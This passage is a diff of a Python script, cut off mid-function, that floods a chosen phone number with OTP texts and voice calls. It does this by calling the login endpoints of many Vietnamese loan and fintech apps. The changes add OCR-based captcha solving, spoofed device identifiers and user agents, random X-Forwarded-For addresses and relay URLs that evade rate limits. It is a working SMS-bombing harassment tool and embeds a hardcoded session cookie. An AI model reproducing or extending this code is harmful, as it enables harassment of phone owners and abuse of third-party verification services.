@@ -1,18 +1,10 @@
 import sys
 import os
-#sys.stdout = open(os.devnull, 'w')
-#sys.stderr = open(os.devnull, 'w')
 import secrets
-import sys
-import os
 import random
 import httpx
 import asyncio
 import time
-from curl_cffi.requests import AsyncSession as BrowserSession
-
-_BROWSER = "chrome120"
-
 import gc
 import uuid
 import hashlib
@@ -28,109 +20,41 @@ import ddddocr
 ImageFile.LOAD_TRUNCATED_IMAGES = True
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
-class HeaderBuilder:
-    def __init__(self, call_origin: str):
-        self.origin = call_origin.rstrip("/")
-
-        self.ios_versions = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
-        self.android_versions = ["11", "12", "13", "14", "15"]
-
-        self.devices = [
-            "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
-            "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro", "Redmi K70", "POCO X6 Pro",
-            "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
-            "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
-            "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
-            "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
-            "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
-        ]
-
-    def _random_ios_ua(self):
-        ios_ver = random.choice(self.ios_versions)
-        webkit = random.randint(600, 605)
-        safari_ver = random.randint(14, 17)
-
-        return (
-            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver.replace('.', '_')} like Mac OS X) "
-            f"AppleWebKit/{webkit}.1 (KHTML, like Gecko) Version/{safari_ver}.0 "
-            f"Mobile/15E148 Safari/{webkit}.1"
-        )
-
-    def _random_android_ua(self):
-        device = random.choice(self.devices)
-        return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(self.android_versions)}; {device})"
-
-    def _random_x_forwarded_for(self):
-        return ".".join(str(random.randint(1, 255)) for _ in range(4))
-
-    def build(self, mode: str = "mix"):
-        if mode == "ios":
-            ua = self._random_ios_ua()
-        elif mode == "android":
-            ua = self._random_android_ua()
-        else:
-            ua = random.choice([self._random_ios_ua(), self._random_android_ua()])
-
-        return {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Content-Type": "application/json",
-            "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
-            "sec-ch-ua-mobile": "?1",
-            "sec-ch-ua-platform": '"Android"',
-            "Sec-Fetch-Site": "same-site",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "User-Agent": ua,
-            "Origin": self.origin,
-            "Referer": self.origin + "/",
-            "X-Device-Id": str(uuid.uuid4()),
-            "X-Device-ID-Alt": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
-            "X-Forwarded-For": self._random_x_forwarded_for(),
-            "Connection": "keep-alive",
-        }
-
-def build_headers(origin: str, mode: str = "mix") -> dict:
-    """Wrapper ngắn cho HeaderBuilder — tự strip hash fragment trong URL."""
-    clean = origin.split("#")[0].rstrip("/")
-    return HeaderBuilder(clean).build(mode)
+def build_headers(origin, mode="ios"):
+    devices = [
+        "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
+        "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro",
+        "Redmi K70", "POCO X6 Pro",
+        "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
+        "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
+        "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
+        "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
+        "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
+    ]
+    android_versions = ["11", "12", "13", "14", "15"]
+    device = random.choice(devices)
+    return {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8",
+        "content-type": "application/json",
+        "x-client-type": "phone",
+        "origin": origin,
+        "referer": origin + "/",
+        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
+        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+        "Accept-Language": random.choice(["vi-VN", "en-US"]),
+        "Accept-Encoding": "gzip"
+    }
 
 def _random_android_id() -> str:
     return ''.join(random.choices('0123456789abcdef', k=32))
 
-def generate_headers():
-    device_id = str(uuid.uuid4()).upper()
-    trace_id = uuid.uuid4().hex
-    span_id = uuid.uuid4().hex[:16]
-    return {
-        "Accept": "*/*",
-        "Accept-Language": "vi-VN",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Content-Type": "application/json",
-        "Connection": "keep-alive",
-        "User-Agent": "RNClientApp/20260325125922 CFNetwork/1568.200.51 Darwin/24.1.0",
-        "x-app-version": "4.39.61",
-        "x-platform": "ios",
-        "x-device-id": device_id,
-        "x-format-money": "json",
-        "x-debug-otp": "false",
-        "sentry-trace": f"{trace_id}-{span_id}",
-        "baggage": (
-            "sentry-environment=production,"
-            "sentry-release=vn.vuiapp.m%404.39.61%2B20260325125922,"
-            "sentry-public_key=2001cef5546e49dc843c73b5edd45a9a,"
-            f"sentry-trace_id={trace_id},"
-            "sentry-org_id=402372"
-        ),
-    }
 def gen_device_id():
     return str(uuid.uuid4()).upper()
 
-
 def get_random_ip():
     return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-
 
 def get_random_ipv6():
     parts = []
@@ -138,7 +62,6 @@ def get_random_ipv6():
         part = format(random.randint(0, 65535), 'x')
         parts.append(part)
     return ':'.join(parts)
-
 
 _VNCREDIT_KEY = b'tdbdif7653scbvy4'
 
@@ -414,20 +337,106 @@ def _achau_body(phone_otp: str, extra: dict) -> dict:
 async def _achau_send(phone_otp: str, endpoint: str, label: str):
     try:
         async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
-            r = await c.post(
+            r1 = await c.post(
                 f"{_ACHAU_BASE}{endpoint}",
                 headers=_achau_headers(),
-                json=_achau_body(phone_otp, {}),
+                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
             )
-            d = r.json()
-            ok = str(d.get("code", "")) == "0"
+            d1 = r1.json()
+            if str(d1.get("code", "")) == "0":
+                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
+                return
+            cap_b64 = (d1.get("data") or {}).get("captcha", "")
+            if not cap_b64:
+                return
+            answer = _qq_solve(cap_b64)
+            if not answer:
+                return
+            r2 = await c.post(
+                f"{_ACHAU_BASE}{endpoint}",
+                headers=_achau_headers(),
+                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
+            )
+            d2 = r2.json()
+            ok = str(d2.get("code", "")) == "0"
             if ok:
-                print(f" ✅ {label} {phone_otp}  {d.get('message', '')}")
+                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
     except Exception as e:
         pass
 
 async def achau_sms(phone_otp: str):
     await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")
+
+_HTC_BASE      = "https://tin.hatacocompany.com"
+_HTC_OWNERSHIP = "hatacovay_ios"
+
+def _htc_headers() -> dict:
+    return {
+        "Content-Type":  "application/json",
+        "Accept":        "application/json, text/plain, */*",
+        "encrypted":     "0",
+        "encryptType":   "0",
+        "disturbedUrl":  "1",
+        "disturbedPar":  "1",
+        "ownerShip":     _HTC_OWNERSHIP,
+        "Origin":        _HTC_BASE,
+        "Referer":       _HTC_BASE + "/",
+        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
+                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    }
+
+def _htc_body(phone_otp: str, extra: dict) -> dict:
+    return {
+        "i18n":            "vi_VN",
+        "reqSource":       "Ios",
+        "phoneName":       "iPhone13,3",
+        "appVersion":      "1.0.2",
+        "androidversion":  "iOS18.1",
+        "webVersion":      "1.0.0",
+        "deviceID":        str(uuid.uuid4()).upper(),
+        "uuid":            uuid.uuid4().hex,
+        "pagingData":      0,
+        "exquisiteItemType": 1,
+        "ownerShip":       _HTC_OWNERSHIP,
+        "token":           "",
+        **extra,
+    }
+
+async def _htc_send(phone_otp: str, endpoint: str, label: str):
+    try:
+        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
+            r1 = await c.post(
+                f"{_HTC_BASE}{endpoint}",
+                headers=_htc_headers(),
+                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
+            )
+            d1 = r1.json()
+            if str(d1.get("code", "")) == "0":
+                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
+                return
+            cap_b64 = (d1.get("data") or {}).get("captcha", "")
+            if not cap_b64:
+                return
+            answer = _qq_solve(cap_b64)
+            if not answer:
+                return
+            r2 = await c.post(
+                f"{_HTC_BASE}{endpoint}",
+                headers=_htc_headers(),
+                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
+            )
+            d2 = r2.json()
+            ok = str(d2.get("code", "")) == "0"
+            if ok:
+                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+    except Exception as e:
+        pass
+
+async def htc_sms(phone_otp: str):
+    await _htc_send(phone_otp, "/base/xmh/getSMSCode", "HTC SMS")
+
+async def htc_voice(phone_otp: str):
+    await _htc_send(phone_otp, "/base/xmh/getVoiceCode", "HTC Voice")
 
 _PETRO_BASE      = "https://loan.gpamcloan.com"
 _PETRO_OWNERSHIP = "GPAMCloan_ios"
@@ -467,31 +476,49 @@ def _petro_body(phone_otp: str, extra: dict) -> dict:
 
 async def _petro_send(phone_otp: str, endpoint: str, label: str):
     try:
-        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
+        async with httpx.AsyncClient(timeout=20, follow_redirects=True, http2=True) as c:
             r1 = await c.post(
                 f"{_PETRO_BASE}{endpoint}",
                 headers=_petro_headers(),
-                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
+                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False})
             )
-            d1 = r1.json()
-            if str(d1.get("code", "")) == "0":
-                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
+            try:
+                d1 = r1.json()
+            except Exception:
+                print(f" ✘ {label} invalid json #1")
                 return
+
+            if str(d1.get("code", "")) == "0":
+                print(f" ✅ {label} {phone_otp} {d1.get('message', '')}")
+                return
+
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
+                print(f" ✘ {label} no captcha")
                 return
+
             answer = _qq_solve(cap_b64)
             if not answer:
+                print(f" ✘ {label} captcha solve fail")
                 return
+
             r2 = await c.post(
                 f"{_PETRO_BASE}{endpoint}",
                 headers=_petro_headers(),
-                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
+                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer})
             )
-            d2 = r2.json()
+
+            try:
+                d2 = r2.json()
+            except Exception:
+                print(f" ✘ {label} invalid json #2")
+                return
+
             ok = str(d2.get("code", "")) == "0"
             if ok:
-                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+                print(f" ✅ {label} {phone_otp} [{answer}] {d2.get('message', '')}")
+            else:
+                print(f" ✘ {label} {phone_otp} [{answer}] {d2}")
     except Exception as e:
         pass
 
@@ -518,11 +545,10 @@ def _vncredit_headers(phone_otp: str) -> dict:
         ),
     }
 
-
 async def vncredit_sms(phone_otp):
     try:
         headers = _vncredit_headers(phone_otp)
-        async with BrowserSession(impersonate=_BROWSER) as client:
+        async with httpx.AsyncClient() as client:
             r = await client.post(
                 "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                 json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
@@ -540,7 +566,7 @@ async def vncredit_sms(phone_otp):
 async def vncredit_voice(phone_otp):
     try:
         headers = _vncredit_headers(phone_otp)
-        async with BrowserSession(impersonate=_BROWSER) as client:
+        async with httpx.AsyncClient() as client:
             r = await client.post(
                 "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                 json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
@@ -562,6 +588,7 @@ async def random_site(phone_otp):
             headers={"Content-Type": "application/json"},
             json={"phone": phone_otp}
         )
+
 async def call_mfast360(phone_otp):
     headers = {
         "Content-Type": "application/json",
@@ -572,428 +599,34 @@ async def call_mfast360(phone_otp):
         "mobile_phone": phone_otp,
         "type": "call",
     }
+    async with httpx.AsyncClient(timeout=10) as client:
+        r = await client.post(
+            "https://asia-south1-mfast-360-prod.cloudfunctions.net/api/auth/sendOtp",
+            json=payload,
+            headers=headers
+        )
+
+async def call_vaydep365(phone_otp: str):
+    CF_URL = [
+        "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
+        "https://wander6fb5.xadoa8.workers.dev/vaydep365",
+        "https://verceldeploy-one-phi.vercel.app/api/vaydep",
+    ]
     try:
         async with httpx.AsyncClient(timeout=10) as client:
             r = await client.post(
-                "https://asia-south1-mfast-360-prod.cloudfunctions.net/api/auth/sendOtp",
-                json=payload,
-                headers=headers,
-            )
-    except:
-        pass
-
-async def calll20(phone_otp):
-    hb = HeaderBuilder("https://vn-ios-h5-artemisdongapp-com.pages.dev")
-
-    payload = {
-        "country_code": "vn",
-        "phone": phone_otp,
-        "app_name": "Artemis Dong",
-        "app_package_name": "com.artmis.dong.vn",
-        "platform": "ios",
-        "app_id": "264000001",
-    }
-
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        headers = hb.build()
-
-        res1 = await client.post(
-            "https://advii.artemisdongapp.com/v2/login/captcha",
-            json={**payload, "type": 1},
-            headers=headers
-        )
-
-        res2 = await client.post(
-            "https://advii.artemisdongapp.com/v2/login/captcha",
-            json={**payload, "type": 2},
-            headers=headers
-        )
-
-    return res1, res2
-
-async def call2(phone_otp):
-    try:
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json;charset=utf-8",
-            "Origin": "https://vaycash.top",
-            "Referer": "https://vaycash.top/",
-            "language": "vi_VN",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-        }
-        payload_1 = {
-            "smsType": "1",
-            "phone": phone_otp,
-            "loanProductName": "u_cash"
-        }
-        async with BrowserSession(impersonate=_BROWSER) as client:
-            r1 = await client.post(
-                "https://vaycash.top/app-domain/api/user/sentSms",
-                headers=headers,
-                json=payload_1
-            )
-            payload_2 = {
-                "type": 2,
-                "productName": "u_cash"
-            }
-            r2 = await client.post(
-                "https://vaycash.top/app-domain/api/user/appCollectUpload",
-                headers=headers,
-                json=payload_2
-            )
-        return True
-    except:
-        return False
-
-async def call1(phone_otp):
-    try:
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json;charset=utf-8",
-            "Origin": "https://ezvay.com",
-            "Referer": "https://ezvay.com/",
-            "language": "vi_VN",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-        }
-        payload_1 = {
-            "smsType": "1",
-            "phone": phone_otp,
-            "loanProductName": "vay_home"
-        }
-        async with BrowserSession(impersonate=_BROWSER) as client:
-            r1 = await client.post(
-                "https://ezvay.com/app-domain/api/user/sentSms",
-                headers=headers,
-                json=payload_1
-            )
-            payload_2 = {
-                "type": 2,
-                "productName": "vay_home"
-            }
-            r2 = await client.post(
-                "https://ezvay.com/app-domain/api/user/appCollectUpload",
-                headers=headers,
-                json=payload_2
-            )
-        return True
-    except:
-        return False
-
-async def vuiap(phone_otp, proxy_url):
-    headers = generate_headers()
-    url     = "https://api-vncdn.t.vuiapp.vn/graphql"
-    payload = {
-        "query": "mutation requestLogin($payload: RequestLoginPayload!) {\n  requestLogin(payload: $payload) {\n    isNew\n    token\n    debug_otp\n    __typename\n  }\n}\n",
-        "variables": {
-            "payload": {
-                "confirmSharingInformation": True,
-                "otpLength": 6,
-                "phoneNumber": phone_otp
-            }
-        },
-        "operationName": "requestLogin"
-    }
-    try:
-        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
-            r = await client.post(url, headers=headers, json=payload)
-        if r.status_code == 200:
-            return True, proxy_url, "OK"
-        return False, proxy_url, f"HTTP {r.status_code}"
-    except:
-        return False, proxy_url, "Failed"
-
-
-async def vuiapp(phone_otp, proxy_url):
-    headers = generate_headers()
-    url     = "https://api-vncdn.vuiapp.vn/graphql"
-    payload = {
-        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
-        "variables": {
-            "payload": {
-                "otpMethod": "Voice",
-                "otpLength": 6,
-                "phoneNumber": phone_otp
-            }
-        },
-        "operationName": "resendAuthenticationOTP"
-    }
-    try:
-        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
-            r = await client.post(url, headers=headers, json=payload)
-        if r.status_code == 200:
-            return True, proxy_url, "OK"
-        return False, proxy_url, f"HTTP {r.status_code}"
-    except:
-        return False, proxy_url, "Failed"
-
-
-async def vuiapp1(phone_otp, proxy_url):
-    headers = generate_headers()
-    url = "https://api-vncdn.vuiapp.vn/graphql"
-    phone_fmt = phone_otp if phone_otp.startswith("+") else f"+84{phone_otp.lstrip('0')}"
-    payload = {
-        "operationName": "requestChangePassword",
-        "variables": {"phoneNumber": phone_fmt, "otpLength": 6},
-        "query": (
-            "mutation requestChangePassword($phoneNumber: PhoneNumber!, $otpLength: Int) {\n"
-            "  requestChangePassword(phoneNumber: $phoneNumber, otpLength: $otpLength) {\n"
-            "    requestId\n    otp { success retryAfter __typename }\n    __typename\n  }\n}\n"
-        ),
-    }
-    try:
-        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
-            r = await client.post(url, headers=headers, json=payload)
-        if r.status_code == 200:
-            return True, proxy_url, "OK"
-        return False, proxy_url, f"HTTP {r.status_code}"
-    except:
-        return False, proxy_url, "Failed"
-
-
-async def vuiapp2(phone_otp, proxy_url):
-    headers = generate_headers()
-    url = "https://api-vncdn.vuiapp.vn/graphql"
-    phone_fmt = phone_otp if phone_otp.startswith("+") else f"+84{phone_otp.lstrip('0')}"
-    payload = {
-        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
-        "variables": {
-            "payload": {
-                "otpMethod": "Voice",
-                "otpLength": 6,
-                "phoneNumber": phone_fmt
-            }
-        },
-        "operationName": "resendAuthenticationOTP"
-    }
-    try:
-        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
-            r = await client.post(url, headers=headers, json=payload)
-        if r.status_code == 200:
-            return True, proxy_url, "OK"
-        return False, proxy_url, f"HTTP {r.status_code}"
-    except:
-        return False, proxy_url, "Failed"
-
-
-async def mfast1(phone_otp):
-    if phone_otp.startswith("0"):
-        phone_otp = "84" + phone_otp[1:]
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://mfast.vn",
-        "Referer": "https://mfast.vn/",
-        "language": "vi_VN",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "X-Requested-With": "XMLHttpRequest",
-    }
-    data = {
-        "phone": phone_otp,
-        "type": "phone",
-    }
-    async with httpx.AsyncClient(timeout=10) as client:
-        r = await client.post(
-            "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
-            headers=headers,
-            data=data,
-        )
-
-async def combo1(phone_otp):
-    headers = build_headers("https://ios-h5.sunmobilefinance.com")
-    payload1 = {
-        "app_name": "Sun Mobile",
-        "packagename": "sunvay.online.vn",
-        "phone": phone_otp,
-        "type": 2,
-        "platform": "ios",
-        "app_id": "238000001",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        r1 = await client.post(
-            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
-            json=payload1,
-            headers=headers
-        )
-
-async def combo2(phone_otp):
-    headers = build_headers("https://ios-h5.sunmobilefinance.com")
-    payload = {
-        "app_name": "Sun Mobile",
-        "packagename": "sunvay.online.vn",
-        "phone": phone_otp,
-        "type": 2,
-        "platform": "android",
-        "app_id": "238000000",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        r2 = await client.post(
-            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
-            headers=headers,
-            json=payload
-        )
-
-async def mfast(phone_otp):
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://mfast.vn",
-        "Referer": "https://mfast.vn/",
-        "language": "vi_VN",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "X-Requested-With": "XMLHttpRequest",
-    }
-    data = {
-        "phone": phone_otp,
-        "type": "phone",
-    }
-    async with httpx.AsyncClient(timeout=10) as client:
-        r = await client.post(
-            "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
-            headers=headers,
-            data=data,
-        )
-
-VAY_DEP365 = [
-        "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
-        "https://wander6fb5.xadoa8.workers.dev/vaydep365",
-        "https://verceldeploy-one-phi.vercel.app/api/vaydep",        
-    ]
-async def call_vaydep365(phone_otp: str):    
-    try:    
-        async with httpx.AsyncClient(timeout=10) as client:    
-            r = await client.post(
-                random.choice(VAY_DEP365),
+                random.choice(CF_URL),
                 json={"phone": phone_otp},
-                timeout=20
             )
         print(f"  vaydep365_valtown | {r.status_code} | {r.text[:200]}")
         return r.json()
     except Exception as e:
         return None
 
-async def call8(phone_otp):
-    headers = build_headers("https://ios-h5.marttimeassrt.com")
-    payload = {
-        "country_code": "vi",
-        "phone": phone_otp,
-        "app_name": "Mar Vay",
-        "app_package_name": "com.maritme.assrt.vn",
-        "platform": "android",
-        "app_id": "266000001",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
-            "https://mvvii.marttimeassrt.com/v2/login/captcha",
-            json={**payload, "type": 2},
-            headers=headers,
-        )
-
-async def call3(phone_otp):
-    phone_formatted = phone_otp.lstrip('0')
-    url = "https://api.hicash.fun/v1/login/send/msm"
-    headers = {
-        "Host": "api.hicash.fun",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://h5.hicash.fun",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "Referer": "https://h5.hicash.fun/",
-        "Accept-Language": "vi-VN,vi;q=0.9",
-        "Priority": "u=3, i",
-    }
-    data = {
-        "phone": phone_formatted,
-        "type": "2",
-        "chntoken": "",
-        "sourse": "1",
-        "ip2": get_random_ip(),
-        "ip3": get_random_ipv6(),
-    }
-    try:
-        async with BrowserSession(impersonate=_BROWSER) as client:
-            response = await client.post(url, headers=headers, data=data)
-        return False, response.text
-    except:
-        return False
-
-
-async def call9(phone_otp):
-    cookies = {
-        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
-        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
-    }
-    headers_get = {
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-        "referer": "https://vayxanh.com/",
-    }
-    headers_post = {
-        "accept": "application/json, text/plain, */*",
-        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/json;charset=utf-8",
-        "origin": "https://lk.vayxanh.com",
-        "referer": f"https://lk.vayxanh.com/?phone={phone_otp}&amount=2000000&term=7",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-        "x-request-id": str(uuid.uuid4()),
-    }
-    try:
-        async with httpx.AsyncClient(timeout=10) as client:
-            resp_get = await client.get(
-                "https://lk.vayxanh.com/",
-                params={"phone": phone_otp, "amount": "2000000", "term": "7",
-                        "utm_source": "direct_vayxanh", "utm_medium": "organic",
-                        "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit"},
-                headers=headers_get,
-            )
-            r = await client.post(
-                "https://lk.vayxanh.com/api/4/client/otp/send",
-                headers=headers_post,
-                json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
-            )
-        return r.status_code == 200
-    except:
-        return False
-
-async def call(phone_otp):
-    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
-    payload = {
-        "country_code": "vi",
-        "phone": phone_otp,
-        "app_name": "Hoi Van Cash",
-        "app_package_name": "onse.hoivan.vn",
-        "platform": "ios",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
-            "https://vnoii.onsenhoivanvn.com/v2/login/captcha",
-            json={**payload, "app_id": "247000001"},
-            headers=headers,
-        )
-
-async def calll(phone_otp):
-    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
-    payload = {
-        "country_code": "vi",
-        "phone": phone_otp,
-        "app_name": "Hoi Van Cash",
-        "app_package_name": "onse.hoivan.vn",
-        "platform": "ios",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
-            "https://vnoai.onsenhoivanvn.com/v2/login/captcha",
-            json={**payload, "type": 2, "app_id": "247000000"},
-            headers=headers,
-        )
-
 async def call_senvay(phone_otp):
     KEY   = b"43frgy5fmjf4647f"
     NONCE = b"\x00" * 12
+
     def enc(plain):
         if isinstance(plain, (dict, list)):
             plain = json.dumps(plain, separators=(",", ":")).encode()
@@ -1041,10 +674,10 @@ async def call_senvay(phone_otp):
                 content=init_body.encode(),
                 headers=make_headers(init_token),
             )
-            server_time_ms = local_before  # fallback: dùng local time nếu sync thất bại
+            server_time_ms = local_before
             if r.status_code == 200:
                 try:
-                    init_data = ri.json()
+                    init_data = r.json()
                     result    = init_data.get("result") or {}
                     sv = result.get("ffolml")
                     if sv and isinstance(sv, (int, float)) and sv > 1_000_000_000_000:
@@ -1066,14 +699,259 @@ async def call_senvay(phone_otp):
             r = await client.post(
                 f"{base_url}{sms_path}",
                 content=sms_body.encode(),
-                headers=make_headers(sms_token),
+                headers=make_headers(sms_token)
             )
-
-        print(f"📡 Status: {r.status_code} | {r.text[:160]}")
         return r.status_code == 200
     except Exception as e:
-        print(f"❌  error: {e}")
         return False
+
+async def call1(phone_otp):
+    try:
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json;charset=utf-8",
+            "Origin": "https://ezvay.com",
+            "Referer": "https://ezvay.com/",
+            "language": "vi_VN",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+            "Accept-Language": "vi-VN,vi;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+        }
+        payload_1 = {
+            "smsType": "1",
+            "phone": phone_otp,
+            "loanProductName": "vay_home"
+        }
+        async with httpx.AsyncClient() as client:
+            r1 = await client.post(
+                "https://ezvay.com/app-domain/api/user/sentSms",
+                headers=headers,
+                json=payload_1
+            )
+            payload_2 = {
+                "type": 2,
+                "productName": "vay_home"
+            }
+            r2 = await client.post(
+                "https://ezvay.com/app-domain/api/user/appCollectUpload",
+                headers=headers,
+                json=payload_2
+            )
+
+        return True
+    except:
